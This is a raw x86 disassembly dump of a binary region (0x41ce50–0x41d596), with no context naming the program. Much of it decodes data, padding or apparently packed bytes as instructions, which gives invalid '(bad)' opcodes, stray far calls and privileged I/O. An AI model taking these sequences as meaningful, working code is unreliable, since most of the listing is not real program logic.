  41ce50:	stos   DWORD PTR es:[edi],eax
  41ce51:	leave  
  41ce52:	sti    
  41ce53:	es mov edi,0x84f08af3
	...
  41ce61:	add    BYTE PTR [eax],al
  41ce63:	add    BYTE PTR [ecx+0x46],cl
  41ce66:	sub    BYTE PTR [eax],dh
  41ce68:	das    
  41ce69:	jle    0x41cec4
  41ce6b:	jg     0x41ce33
  41ce6d:	imul   esi,eax,0xffffffd5
  41ce70:	in     al,0x81
  41ce72:	xchg   esp,eax
  41ce73:	mov    BYTE PTR [edi-0x52fffe55],0x0
  41ce7a:	add    BYTE PTR [eax],al
  41ce7c:	int3   
  41ce7d:	test   DWORD PTR [edx+esi*1-0x44],ebx
  41ce81:	mov    al,ds:0x9717d10
  41ce86:	ret    0x8e9b
  41ce89:	cmc    
  41ce8a:	xor    DWORD PTR [edx+ebx*8],edx
  41ce8d:	or     eax,DWORD PTR [ebx-0x7623116e]
  41ce93:	jp     0x41ce63
  41ce95:	adc    eax,0x7031cec1
  41ce9a:	push   0xffffffa7
  41ce9c:	call   0xa9c2:0x2e226f33
  41cea3:	call   0xec0178f
  41cea8:	pushf  
  41cea9:	mov    eax,0xdd594001
  41ceae:	or     DWORD PTR [ecx+0x35],0xffffffb1
  41ceb2:	arpl   di,cx
  41ceb4:	outs   dx,DWORD PTR ds:[esi]
  41ceb5:	cmp    eax,0x2618dc30
  41ceba:	rol    DWORD PTR [edx+0x2f],cl
  41cebd:	(bad)  
  41cebf:	push   ss
  41cec0:	push   cs
  41cec1:	jp     0x41ce89
  41cec3:	in     al,dx
  41cec4:	jp     0x41ce8d
  41cec6:	jno    0x41cf01
  41cec8:	hlt    
  41cec9:	push   edx
  41ceca:	pop    ss
  41cecb:	push   ecx
  41cecc:	or     al,0xf4
  41cece:	xor    DWORD PTR [edi-0x48],esp
  41ced1:	push   ebx
  41ced2:	call   0xa934:0x47c333
  41ced9:	es aam 0x80
  41cedc:	jmp    0x41cf33
  41cede:	jg     0x41ce8f
  41cee0:	mov    eax,0x5fef8af2
  41cee5:	pop    ecx
  41cee6:	mov    cl,0xbf
  41cee8:	outs   dx,DWORD PTR ds:[esi]
  41cee9:	mov    bl,0xb7
  41ceeb:	sub    al,0xb1
  41ceed:	scas   eax,DWORD PTR es:[edi]
  41ceee:	adc    cl,BYTE PTR [eax+0x744f30cc]
  41cef4:	adc    cl,BYTE PTR [ebx+0x6]
  41cef7:	outs   dx,BYTE PTR ds:[esi]
  41cef8:	inc    esi
  41cef9:	fmul   DWORD PTR [esi+0x69]
  41cefc:	fnstsw WORD PTR [ebx-0x1f3e9ed7]
  41cf02:	repz dec esp
  41cf04:	in     al,0x93
  41cf06:	adc    al,BYTE PTR [ebx-0x60da1c5]
  41cf0c:	push   ss
  41cf0d:	popf   
  41cf0e:	or     al,0x35
  41cf10:	cli    
  41cf11:	mov    ds:0xb38b5615,eax
  41cf16:	stos   DWORD PTR es:[edi],eax
  41cf17:	cmp    al,0xf2
  41cf19:	mov    ebp,0x6d59815a
  41cf1e:	mov    esi,0xfd58d1a2
  41cf23:	retf   
  41cf24:	adc    BYTE PTR [ecx+0xfd9a49],bl
	...
  41cf32:	add    BYTE PTR [eax],al
  41cf34:	addr16 (bad) 
  41cf36:	and    dh,dh
  41cf38:	mov    eax,ds:0xe7d7f7f6
  41cf3d:	mov    eax,0xf70ada72
  41cf42:	jae    0x41cf48
  41cf44:	xor    al,0xac
  41cf46:	add    DWORD PTR [eax],eax
  41cf48:	lods   eax,DWORD PTR ds:[esi]
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    BYTE PTR [edi],bh
  41cf4d:	mov    ch,0x8a
  41cf4f:	arpl   si,dx
  41cf51:	mov    edi,0x4817a33a
  41cf56:	ins    DWORD PTR es:[edi],dx
  41cf57:	cwde   
  41cf58:	repnz (bad) 
  41cf5a:	xchg   edx,eax
  41cf5b:	xor    DWORD PTR [ebx-0x3213a84e],ebp
  41cf61:	fldenv [esi]
  41cf63:	lahf   
  41cf64:	sahf   
  41cf65:	fadd   QWORD PTR [ebx+0x27dfce84]
  41cf6b:	ret    0x7261
  41cf6e:	mov    edx,eax
  41cf70:	mov    BYTE PTR [eax+0x6e0ce4d5],bl
  41cf76:	xor    eax,0xaef643a4
  41cf7b:	cli    
  41cf7c:	jg     0x41cfb3
  41cf7e:	pop    edi
  41cf7f:	jns    0x41cfa9
  41cf81:	xchg   DWORD PTR [ebx-0x5e],ebx
  41cf84:	mov    ds:0xbfb10525,eax
  41cf89:	push   eax
  41cf8a:	sbb    ebp,DWORD PTR [ecx+0x734f2d4d]
  41cf90:	sahf   
  41cf91:	addr16 pop ss
  41cf93:	fwait
  41cf94:	ret    0xd05
  41cf97:	adc    eax,0x4f403759
  41cf9c:	jmp    0x41cfeb
  41cf9e:	(bad)  
  41cf9f:	lds    ecx,FWORD PTR [eax+0x71]
  41cfa2:	sbb    DWORD PTR [edi-0x18de010d],0xfffffffb
  41cfa9:	adc    al,0xe1
  41cfab:	sub    eax,0x68edd08d
  41cfb0:	adc    eax,0xde8c8097
  41cfb5:	in     al,0x36
  41cfb7:	into   
  41cfb8:	out    dx,eax
  41cfb9:	arpl   dx,dx
  41cfbb:	scas   al,BYTE PTR es:[edi]
  41cfbc:	mov    esp,ebp
  41cfbe:	dec    edx
  41cfbf:	sbb    edx,DWORD PTR [ebp-0x139b8ee5]
  41cfc5:	pop    esi
  41cfc6:	(bad)  
  41cfc7:	fs repz jns 0x41cfc3
  41cfcb:	call   0xf220:0x4ef97f35
  41cfd2:	push   es
  41cfd3:	cmp    ah,BYTE PTR [esi+0x12]
  41cfd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfd7:	outs   dx,DWORD PTR ds:[esi]
  41cfd8:	and    eax,0x7d7939cc
  41cfdd:	rcr    DWORD PTR fs:[esi+0x1ddadb9b],1
  41cfe4:	std    
  41cfe5:	mov    ?,WORD PTR [edx-0x2f]
  41cfe8:	or     al,BYTE PTR ds:[eax-0xac86bd7]
  41cfef:	dec    eax
  41cff0:	push   ds
  41cff1:	out    dx,al
  41cff2:	cmp    ecx,DWORD PTR [ecx+edi*8+0x4b]
  41cff6:	ins    BYTE PTR es:[edi],dx
  41cff7:	adc    BYTE PTR [ebx+0x0],ah
  41cffd:	add    BYTE PTR [eax],al
  41cfff:	add    BYTE PTR [eax],al
  41d001:	add    BYTE PTR [eax],al
  41d003:	add    bl,al
  41d005:	or     eax,0xefee66a6
  41d00a:	ret    
  41d00b:	lods   eax,DWORD PTR ds:[esi]
  41d00c:	sub    al,0xb8
  41d00e:	mov    ds:0x35c9047,eax
  41d013:	stos   DWORD PTR es:[edi],eax
  41d014:	loope  0x41cfc2
  41d016:	add    DWORD PTR [eax],eax
  41d018:	lods   eax,DWORD PTR ds:[esi]
  41d019:	add    BYTE PTR [eax],al
  41d01b:	add    dl,ah
  41d01d:	or     dl,cl
  41d01f:	sub    bh,BYTE PTR [esi+0x58]
  41d022:	pop    edx
  41d023:	pushw  ss
  41d025:	outs   dx,BYTE PTR ds:[esi]
  41d026:	add    al,0x58
  41d028:	mov    esi,0x76948dc8
  41d02d:	call   DWORD PTR [ecx]
  41d02f:	push   esi
  41d030:	arpl   WORD PTR [ebp+ecx*2+0x3d],sp
  41d034:	adc    BYTE PTR [eax],0xe
  41d037:	mov    al,0x3e
  41d039:	fisttp QWORD PTR [ebx]
  41d03b:	mov    WORD PTR [eax+esi*2+0x25918b52],ds
  41d042:	xchg   esi,eax
  41d043:	outs   dx,BYTE PTR ds:[esi]
  41d044:	lahf   
  41d045:	pop    DWORD PTR [esp+ecx*4]
  41d048:	cmp    BYTE PTR [ebx+0x3f],dl
  41d04b:	mov    cl,0x83
  41d04d:	rcl    BYTE PTR [eax-0x79b8374b],0xc5
  41d054:	add    al,0xc9
  41d056:	mov    gs,WORD PTR [ecx+0x7433ba8a]
  41d05c:	loopne 0x41d011
  41d05e:	mov    al,ds:0xbabc8dd8
  41d063:	mov    ch,0xad
  41d065:	sbb    BYTE PTR [esp+ecx*8-0x71a2e79f],dh
  41d06c:	mov    ebx,0xe896d9ab
  41d071:	sbb    DWORD PTR [ebp-0x1f],edi
  41d074:	jecxz  0x41d082
  41d076:	cmp    al,BYTE PTR [ebp+0x2b3ac78d]
  41d07c:	clc    
  41d07d:	mov    eax,ds:0xbe9197da
  41d082:	sub    DWORD PTR [esi-0x45c70495],esi
  41d088:	pop    edi
  41d089:	imul   edx,DWORD PTR ds:0xcea5133d,0xffffff97
  41d090:	mov    al,ds:0x3729749e
  41d095:	pop    esp
  41d096:	in     eax,0xd7
  41d098:	sbb    bl,BYTE PTR [esi+0x75]
  41d09b:	fmul   st,st(0)
  41d09d:	stos   DWORD PTR es:[edi],eax
  41d09e:	cmc    
  41d09f:	mov    bh,0x57
  41d0a1:	ret    
  41d0a2:	adc    al,0xf9
  41d0a4:	mov    ah,0x3
  41d0a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0a7:	imul   edi,DWORD PTR [eax-0x72],0x3e
  41d0ab:	xchg   ebp,eax
  41d0ac:	addr16 push ebx
  41d0ae:	lahf   
  41d0af:	mov    al,ds:0x85ce0efd
  41d0b4:	xor    eax,0x6ce3fdc5
  41d0b9:	xlat   BYTE PTR ds:[ebx]
  41d0ba:	mov    ebx,0xd5862499
  41d0bf:	inc    edx
  41d0c0:	into   
  41d0c1:	lahf   
  41d0c2:	cld    
  41d0c3:	push   esi
  41d0c4:	into   
  41d0c5:	push   ecx
  41d0c6:	rcl    DWORD PTR fs:[edi+0x0],cl
  41d0cd:	add    BYTE PTR [eax],al
  41d0cf:	add    BYTE PTR [eax],al
  41d0d1:	add    BYTE PTR [eax],al
  41d0d3:	add    cl,bl
  41d0d5:	ret    0x4905
  41d0d8:	pop    ds
  41d0d9:	iret   
  41d0da:	fst    st(2)
  41d0dc:	enter  0xf86f,0xd2
  41d0e0:	retf   
  41d0e1:	in     eax,dx
  41d0e2:	popf   
  41d0e3:	bound  ecx,QWORD PTR [esi-0x52fffe53]
  41d0e9:	add    BYTE PTR [eax],al
  41d0eb:	add    BYTE PTR [eax],al
  41d0ed:	bound  edi,QWORD PTR [edi]
  41d0ef:	scas   eax,DWORD PTR es:[edi]
  41d0f0:	stos   DWORD PTR es:[edi],eax
  41d0f1:	stos   DWORD PTR es:[edi],eax
  41d0f2:	adc    al,0xf8
  41d0f4:	ja     0x41d10d
  41d0f6:	cmp    eax,0xf0d59b93
  41d0fb:	pop    ecx
  41d0fc:	push   esi
  41d0fd:	data16 jge 0x41d08a
  41d100:	leave  
  41d101:	pop    es
  41d102:	or     esp,ecx
  41d104:	adc    bh,BYTE PTR [eax+edx*8-0x6a812765]
  41d10b:	adc    eax,0x59c5de00
  41d110:	jmp    0xaef1:0x63ed6453
  41d117:	dec    edi
  41d118:	lock inc eax
  41d11a:	scas   eax,DWORD PTR es:[edi]
  41d11b:	mov    BYTE PTR [edx+0x17b35479],ah
  41d121:	jp     0x41d161
  41d123:	mov    bh,0x98
  41d125:	jge    0x41d154
  41d127:	es push ebp
  41d129:	dec    ebp
  41d12a:	cmp    DWORD PTR [edx],eax
  41d12c:	mov    cl,0x15
  41d12e:	inc    edi
  41d12f:	js     0x41d17f
  41d131:	mov    ebx,0x3af6d1c6
  41d136:	das    
  41d137:	ret    0x7ae1
  41d13a:	pop    esp
  41d13b:	adc    BYTE PTR [eax+0x3e7044cc],al
  41d141:	in     eax,dx
  41d142:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d143:	adc    al,0x75
  41d145:	leave  
  41d146:	mov    dl,0x6a
  41d148:	jnp    0x41d18c
  41d14a:	inc    ebx
  41d14b:	cmp    ch,ch
  41d14d:	pusha  
  41d14e:	cmp    esp,edi
  41d150:	or     eax,0xdbc0a917
  41d155:	out    dx,al
  41d156:	popa   
  41d157:	aas    
  41d158:	add    BYTE PTR [ecx],al
  41d15a:	out    dx,eax
  41d15b:	mov    edx,0x5306395c
  41d160:	loope  0x41d1a8
  41d162:	add    esi,eax
  41d164:	add    al,0x68
  41d166:	cmp    esi,DWORD PTR [esi]
  41d168:	rol    BYTE PTR [esi+0x24],cl
  41d16b:	push   ss
  41d16c:	add    ch,cl
  41d16e:	sub    edx,0xffffffaa
  41d171:	dec    esp
  41d173:	sahf   
  41d174:	jg     0x41d116
  41d176:	cmp    DWORD PTR [eax+0x25117f82],0x40
  41d17d:	stc    
  41d17e:	adc    eax,0xb57af4dc
  41d183:	rol    BYTE PTR [ebp-0x3b],0xe7
  41d187:	push   0xca87f98
  41d18c:	(bad)  
  41d18d:	fs das 
  41d18f:	or     cl,ah
  41d191:	mov    ecx,0x44dde9da
  41d196:	lahf   
  41d197:	in     al,0xc0
	...
  41d1a1:	add    BYTE PTR [eax],al
  41d1a3:	add    BYTE PTR [ecx+0x5f],ah
  41d1a6:	lock (bad) 
  41d1a8:	(bad)  
  41d1a9:	out    dx,eax
  41d1aa:	repz pop edi
  41d1ac:	mov    dl,0xc5
  41d1ae:	ret    
  41d1af:	in     eax,dx
  41d1b0:	fldcw  WORD PTR [eax]
  41d1b2:	jb     0x41d1ee
  41d1b4:	cmp    ebp,DWORD PTR [esi+0x170001]
  41d1ba:	add    BYTE PTR [eax],al
  41d1bc:	xchg   ebp,eax
  41d1bd:	pop    edx
  41d1be:	mov    al,ds:0xf892de42
  41d1c3:	xor    bl,bh
  41d1c5:	cmp    al,0x79
  41d1c7:	add    BYTE PTR [ebp-0x38],0x7e
  41d1cb:	mov    al,ds:0x1bcba72c
  41d1d0:	arpl   bx,si
  41d1d2:	adc    al,BYTE PTR [eax]
  41d1d4:	add    BYTE PTR [eax+0x42],ah
  41d1d7:	add    BYTE PTR [eax+eiz*2],al
  41d1da:	inc    edx
  41d1db:	add    BYTE PTR [eax],cl
  41d1dd:	pusha  
  41d1de:	inc    edx
  41d1df:	add    BYTE PTR [eax+eiz*2],cl
  41d1e2:	inc    edx
  41d1e3:	add    BYTE PTR [eax],dl
  41d1e5:	pusha  
  41d1e6:	inc    edx
  41d1e7:	add    BYTE PTR [eax+eiz*2],dl
  41d1ea:	inc    edx
  41d1eb:	add    BYTE PTR [eax],bl
  41d1ed:	pusha  
  41d1ee:	inc    edx
  41d1ef:	add    BYTE PTR [eax+eiz*2],bl
  41d1f2:	inc    edx
  41d1f3:	add    BYTE PTR [eax],al
  41d1f5:	jo     0x41d239
  41d1f7:	add    BYTE PTR [eax+esi*2],al
  41d1fa:	inc    edx
  41d1fb:	add    BYTE PTR [eax],cl
  41d1fd:	jo     0x41d241
  41d1ff:	add    BYTE PTR [eax+esi*2],cl
  41d202:	inc    edx
  41d203:	add    BYTE PTR [eax],dl
  41d205:	jo     0x41d249
  41d207:	add    BYTE PTR [eax+esi*2],dl
  41d20a:	inc    edx
  41d20b:	add    BYTE PTR [eax],bl
  41d20d:	jo     0x41d251
  41d20f:	add    BYTE PTR [eax+esi*2],bl
  41d212:	inc    edx
  41d213:	add    BYTE PTR [eax],al
  41d215:	add    BYTE PTR [edx+0x0],0x4
  41d219:	add    BYTE PTR [edx+0x0],0x8
  41d21d:	add    BYTE PTR [edx+0x0],0xc
  41d221:	add    BYTE PTR [edx+0x0],0x10
  41d225:	add    BYTE PTR [edx+0x0],0x14
  41d229:	add    BYTE PTR [edx+0x0],0x18
  41d22d:	add    BYTE PTR [edx+0x0],0x1c
  41d231:	add    BYTE PTR [edx+0x0],0x78
  41d235:	data16 ins BYTE PTR es:[edi],dx
  41d237:	jp     0x41d290
  41d239:	jbe    0x41d282
  41d23b:	ja     0x41d280
  41d23d:	js     0x41d287
  41d23f:	jno    0x41d291
  41d241:	arpl   WORD PTR [ebx+0x6f],dx
  41d244:	inc    edi
  41d245:	dec    esi
  41d246:	outs   dx,DWORD PTR ds:[esi]
  41d247:	pop    ecx
  41d248:	inc    edi
  41d249:	jb     0x41d292
  41d24b:	jns    0x41d2c3
  41d24d:	inc    ecx
  41d24e:	pop    eax
  41d24f:	dec    esp
  41d250:	add    BYTE PTR [eax],al
  41d252:	add    BYTE PTR [eax],al
  41d254:	(bad)  
  41d256:	inc    ecx
  41d257:	add    ah,ah
  41d259:	aad    0x41
  41d25b:	add    BYTE PTR [esp+edx*8+0xbef0041],bl
  41d262:	mov    dl,0xe
  41d264:	jns    0x41d2b4
  41d266:	xor    BYTE PTR [esi-0x79],cl
  41d269:	dec    edi
  41d26a:	cmp    eax,0x3e4faf4e
  41d26f:	dec    esi
  41d270:	js     0x41d2c0
  41d272:	cmp    ecx,DWORD PTR [esi-0x64]
  41d275:	dec    edi
  41d276:	inc    esp
  41d277:	dec    esi
  41d278:	jae    0x41d2c8
  41d27a:	inc    ecx
  41d27b:	dec    esi
  41d27c:	xor    BYTE PTR [esi+0x40],cl
  41d27f:	dec    esi
  41d280:	pop    esp
  41d281:	pop    ebp
  41d282:	pop    edi
  41d283:	push   edx
  41d284:	cmp    DWORD PTR [esi+0x79],ecx
  41d287:	dec    esi
  41d288:	xor    BYTE PTR [esi-0x79],cl
  41d28b:	dec    edi
  41d28c:	cmp    eax,0x3e4faf4e
  41d291:	dec    esi
  41d292:	js     0x41d2e2
  41d294:	cmp    ecx,DWORD PTR [esi-0x64]
  41d297:	dec    edi
  41d298:	inc    esp
  41d299:	dec    esi
  41d29a:	mov    DWORD PTR [edi+0x41],ecx
  41d29d:	dec    esi
  41d29e:	xor    BYTE PTR [esi+0x40],cl
  41d2a1:	dec    esi
  41d2a2:	pop    esp
  41d2a3:	ins    DWORD PTR es:[edi],dx
  41d2a4:	pop    edi
  41d2a5:	bound  edi,QWORD PTR [ecx]
  41d2a7:	dec    esi
  41d2a8:	jns    0x41d2f8
  41d2aa:	xor    BYTE PTR [esi-0x80],cl
  41d2ad:	dec    edi
  41d2ae:	cmp    eax,0x394e734e
  41d2b3:	dec    esi
  41d2b4:	mov    ds:0x304e3a4f,al
  41d2b9:	dec    esi
  41d2ba:	inc    esi
  41d2bb:	dec    esi
  41d2bc:	pop    esp
  41d2bd:	jge    0x41d31e
  41d2bf:	jb     0x41d330
  41d2c1:	sub    BYTE PTR [esi-0x7d],0x7e
  41d2c5:	xchg   ebx,eax
  41d2c6:	jns    0x41d258
  41d2c8:	aas    
  41d2c9:	dec    esi
  41d2ca:	test   BYTE PTR [edi+0x30],cl
  41d2cd:	dec    esi
  41d2ce:	test   BYTE PTR [edi+0x3c],cl
  41d2d1:	dec    esi
  41d2d2:	mov    ds:0x734e394f,al
  41d2d7:	dec    esi
  41d2d8:	inc    ebp
  41d2d9:	dec    esi
  41d2da:	xor    BYTE PTR [esi+0x44],cl
  41d2dd:	dec    esi
  41d2de:	pop    esp
  41d2df:	lea    ebx,[edi-0x7e]
  41d2e2:	outs   dx,DWORD PTR ds:[esi]
  41d2e3:	xchg   edx,eax
  41d2e4:	outs   dx,BYTE PTR ds:[esi]
  41d2e5:	xchg   ebx,eax
  41d2e6:	jle    0x41d28b
  41d2e8:	jns    0x41d28a
  41d2ea:	aas    
  41d2eb:	dec    esi
  41d2ec:	test   BYTE PTR [edi+0x30],cl
  41d2ef:	dec    esi
  41d2f0:	test   BYTE PTR [edi+0x3c],cl
  41d2f3:	dec    esi
  41d2f4:	mov    ds:0x894e394f,al
  41d2f9:	dec    edi
  41d2fa:	inc    ebp
  41d2fb:	dec    esi
  41d2fc:	xor    BYTE PTR [esi+0x44],cl
  41d2ff:	dec    esi
  41d300:	pop    esp
  41d301:	popf   
  41d302:	pop    edi
  41d303:	xchg   edx,eax
  41d304:	outs   dx,DWORD PTR ds:[esi]
  41d305:	mov    ds:0xb37ea36e,al
  41d30a:	jns    0x41d2bc
  41d30c:	aas    
  41d30d:	dec    esi
  41d30e:	mov    cs,WORD PTR [edi+0x30]
  41d311:	dec    esi
  41d312:	lods   al,BYTE PTR ds:[esi]
  41d313:	dec    edi
  41d314:	cmp    eax,0x394e734e
  41d319:	dec    esi
  41d31a:	mov    eax,ds:0x304e3a4f
  41d31f:	dec    esi
  41d320:	inc    esp
  41d321:	dec    esi
  41d322:	pop    esp
  41d323:	lods   eax,DWORD PTR ds:[esi]
  41d324:	pop    edi
  41d325:	mov    ds:0xb36eb26f,al
  41d32a:	jle    0x41d2ef
  41d32c:	jns    0x41d2ee
  41d32e:	aas    
  41d32f:	dec    esi
  41d330:	mov    cs,WORD PTR [edi+0x30]
  41d333:	dec    esi
  41d334:	lods   al,BYTE PTR ds:[esi]
  41d335:	dec    edi
  41d336:	cmp    eax,0x394e7e4e
  41d33b:	dec    esi
  41d33c:	lahf   
  41d33d:	dec    edi
  41d33e:	cmp    ecx,DWORD PTR [esi+0x30]
  41d341:	dec    esi
  41d342:	inc    ebp
  41d343:	dec    esi
  41d344:	pop    esp
  41d345:	mov    ebp,0xc26fb25f
  41d34a:	outs   dx,BYTE PTR ds:[esi]
  41d34b:	ret    
  41d34c:	jle    0x41d321
  41d34e:	jns    0x41d320
  41d350:	aas    
  41d351:	dec    esi
  41d352:	mov    cs,WORD PTR [edi+0x30]
  41d355:	dec    esi
  41d356:	lods   al,BYTE PTR ds:[esi]
  41d357:	dec    edi
  41d358:	cmp    eax,0x394f804e
  41d35d:	dec    esi
  41d35e:	lods   al,BYTE PTR ds:[esi]
  41d35f:	dec    edi
  41d360:	cmp    cl,BYTE PTR [esi+0x30]
  41d363:	dec    esi
  41d364:	inc    esi
  41d365:	dec    esi
  41d366:	pop    esp
  41d367:	int    0x5f
  41d369:	ret    0xd26f
  41d36c:	outs   dx,BYTE PTR ds:[esi]
  41d36d:	sar    DWORD PTR [esi-0x1d],cl
  41d370:	jns    0x41d352
  41d372:	aas    
  41d373:	dec    esi
  41d374:	mov    cs,WORD PTR [edi+0x30]
  41d377:	dec    esi
  41d378:	lods   al,BYTE PTR ds:[esi]
  41d379:	dec    edi
  41d37a:	cmp    eax,0x394f834e
  41d37f:	dec    esi
  41d380:	mov    ds:0x304e3a4f,al
  41d385:	dec    esi
  41d386:	inc    esp
  41d387:	dec    esi
  41d388:	pop    esp
  41d389:	fstp   QWORD PTR [edi-0x2e]
  41d38c:	outs   dx,DWORD PTR ds:[esi]
  41d38d:	loop   0x41d3fd
  41d38f:	jecxz  0x41d40f
  41d391:	repz jns 0x41d384
  41d394:	aas    
  41d395:	dec    esi
  41d396:	lea    ecx,[edi+0x30]
  41d399:	dec    esi
  41d39a:	lahf   
  41d39b:	dec    edi
  41d39c:	cmp    eax,0x3c4fa04e
  41d3a1:	dec    esi
  41d3a2:	xor    BYTE PTR [esi+0x3f],cl
  41d3a5:	dec    esi
  41d3a6:	pop    esp
  41d3a7:	in     eax,dx
  41d3a8:	pop    edi
  41d3a9:	loop   0x41d41a
  41d3ab:	repnz outs dx,BYTE PTR ds:[esi]
  41d3ad:	repz jle 0x41d3b3
  41d3b0:	jns    0x41d3b2
  41d3b2:	jle    0x41d3c7
  41d3b4:	jns    0x41d3c6
  41d3b6:	cmp    al,0x4e
  41d3b8:	jg     0x41d408
  41d3ba:	xor    BYTE PTR [esi-0x65],cl
  41d3bd:	dec    edi
  41d3be:	xor    cl,BYTE PTR [esi-0x80]
  41d3c1:	dec    edi
  41d3c2:	cmp    al,0x4e
  41d3c4:	lods   eax,DWORD PTR ds:[esi]
  41d3c5:	dec    edi
  41d3c6:	cmp    ecx,DWORD PTR [esi+0x30]
  41d3c9:	dec    esi
  41d3ca:	inc    ebp
  41d3cb:	dec    esi
  41d3cc:	pop    esp
  41d3cd:	or     eax,0x126f025f
  41d3d2:	outs   dx,BYTE PTR ds:[esi]
  41d3d3:	adc    edi,DWORD PTR [esi+0x23]
  41d3d6:	jns    0x41d3f8
  41d3d8:	aas    
  41d3d9:	dec    esi
  41d3da:	add    BYTE PTR [eax],al
  41d3dc:	rol    BYTE PTR fs:[ecx+0x0],cl
  41d3e0:	pop    eax
  41d3e1:	aam    0x41
  41d3e3:	add    BYTE PTR [eax-0x2c],ah
  41d3e6:	inc    ecx
  41d3e7:	add    al,ch
  41d3e9:	aad    0x41
  41d3eb:	add    BYTE PTR [ebp+edx*8+0x41],dl
  41d3ef:	add    al,bl
  41d3f1:	aad    0x41
  41d3f3:	add    BYTE PTR [eax-0x2c],al
  41d3f6:	inc    ecx
  41d3f7:	add    BYTE PTR [esp+edx*8+0x41],al
  41d3fb:	add    ah,dl
  41d3fd:	aad    0x41
  41d3ff:	add    BYTE PTR [eax+0xd0041d4],ch
  41d405:	test   eax,0xba36f89c
  41d40a:	pushf  
  41d40b:	clc    
  41d40c:	pop    esp
  41d40d:	aam    0x41
  41d40f:	add    BYTE PTR [edx*8-0x2adfffbf],cl
  41d416:	inc    ecx
  41d417:	add    BYTE PTR [edx*8-0x2ac3ffbf],ch
  41d41e:	inc    ecx
  41d41f:	add    BYTE PTR [esp+edx*8-0x2d9fffbf],dl
  41d426:	inc    ecx
  41d427:	add    BYTE PTR [esp+edx*8-0x2b5bffbf],dh
  41d42e:	inc    ecx
  41d42f:	add    ah,ch
  41d431:	aad    0x41
  41d433:	add    BYTE PTR [esi+0x19f89c85],dh
  41d439:	or     edx,DWORD PTR [edi]
  41d43b:	sub    DWORD PTR [eax-0x2c],0x1c140041
  41d442:	push   ss
  41d443:	or     DWORD PTR [eax],0x7050d
  41d449:	add    BYTE PTR [eax+0x0],al
  41d44c:	cmp    al,BYTE PTR [edx+0x3e]
  41d44f:	ds retf 0x4247
  41d453:	add    BYTE PTR [ebp+0x55],ch
  41d456:	inc    esp
  41d457:	imul   ecx,DWORD PTR [eax],0x86275fa
  41d45d:	in     eax,dx
  41d45e:	inc    BYTE PTR [edi]
  41d460:	aas    
  41d461:	cli    
  41d462:	mov    ds:0x41d45005,eax
  41d467:	add    BYTE PTR [ebp-0x4a07636b],dh
  41d46d:	xchg   esi,eax
  41d46e:	pushf  
  41d46f:	clc    
  41d470:	mov    ah,0x95
  41d472:	pushf  
  41d473:	clc    
  41d474:	mov    ebx,0xbaf89c95
  41d479:	xchg   ebp,eax
  41d47a:	pushf  
  41d47b:	clc    
  41d47c:	mov    ecx,0xb8f89c95
  41d481:	xchg   ebp,eax
  41d482:	pushf  
  41d483:	clc    
  41d484:	mov    edi,0xbef89c95
  41d489:	xchg   ebp,eax
  41d48a:	pushf  
  41d48b:	clc    
  41d48c:	mov    ebp,0xa6f89c95
  41d491:	xchg   ebp,eax
  41d492:	pushf  
  41d493:	clc    
  41d494:	jmp    0x41d2:0x586003f9
  41d49b:	add    BYTE PTR [eax+edx*1+0x77530042],cl
  41d4a2:	jbe    0x41d4f4
  41d4a4:	mov    dh,0x85
  41d4a6:	pushf  
  41d4a7:	clc    
  41d4a8:	sbb    ecx,ebp
  41d4aa:	push   eax
  41d4ab:	pop    es
  41d4ac:	es pop es
  41d4ae:	add    BYTE PTR [eax],al
  41d4b0:	push   esp
  41d4b1:	rol    BYTE PTR [ecx+0x0],cl
  41d4b4:	sbb    ecx,DWORD PTR [ebx]
  41d4b6:	add    al,0xe
	...
  41d4e8:	mov    WORD PTR [eax],ss
  41d4ea:	inc    edx
  41d4eb:	add    BYTE PTR [esi+0x67f89c85],dh
  41d4f1:	pushw  0x68
  41d4f4:	addr16 push 0x67
  41d4f7:	pushw  0x6b6a
  41d4fb:	push   0x676b67
	...
  41d508:	es aas 
  41d50a:	inc    eax
  41d50b:	add    BYTE PTR [ebp-0x5db060b1],ah
  41d511:	dec    edi
  41d512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d513:	dec    edi
  41d514:	lahf   
  41d515:	dec    edi
  41d516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d517:	dec    edi
  41d518:	ins    DWORD PTR es:[edi],dx
  41d519:	dec    esi
  41d51a:	bound  ecx,QWORD PTR [esi+0x30]
  41d51d:	dec    esi
  41d51e:	add    BYTE PTR [eax],al
  41d520:	cdq    
  41d521:	dec    edi
  41d522:	pushf  
  41d523:	dec    edi
  41d524:	fwait
  41d525:	dec    edi
  41d526:	ins    DWORD PTR es:[edi],dx
  41d527:	dec    esi
  41d528:	bound  ecx,QWORD PTR [esi+0x30]
  41d52b:	dec    esi
  41d52c:	scas   eax,DWORD PTR es:[edi]
  41d52d:	dec    edi
  41d52e:	lods   eax,DWORD PTR ds:[esi]
  41d52f:	dec    edi
  41d530:	lahf   
  41d531:	dec    edi
  41d532:	mov    ds:0x624e6d4f,al
  41d537:	dec    esi
  41d538:	xor    BYTE PTR [esi+0x0],cl
  41d53b:	add    BYTE PTR [ebp-0x5bb067b1],ch
  41d541:	dec    edi
  41d542:	test   eax,0xa04f934f
  41d547:	dec    edi
  41d548:	fwait
  41d549:	dec    edi
  41d54a:	xor    BYTE PTR [esi+0x0],cl
  41d54d:	add    BYTE PTR [eax],al
  41d54f:	add    BYTE PTR [eax],al
  41d551:	add    BYTE PTR [eax],al
  41d553:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  41d55a:	mov    WORD PTR [ebp-0x32734274],gs
  41d560:	mov    ebp,ds
  41d562:	mov    ebp,gs
  41d564:	mov    ebp,?
  41d566:	mov    WORD PTR ds:0x2d8c1d8c,cs
  41d56c:	mov    WORD PTR ds:0x6d8c5d8c,?
  41d572:	mov    WORD PTR [edx-0x74],?
  41d575:	jae    0x41d503
  41d577:	jo     0x41d505
  41d579:	jno    0x41d507
  41d57b:	jbe    0x41d509
  41d57d:	ja     0x41d50b
  41d57f:	je     0x41d50d
  41d581:	jne    0x41d50f
  41d583:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  41d58a:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  41d590:	lods   al,BYTE PTR ds:[esi]
  41d591:	jge    0x41d54f
  41d593:	jge    0x41d533
  41d595:	(bad)  
  41d596:	jns    0x41d60b
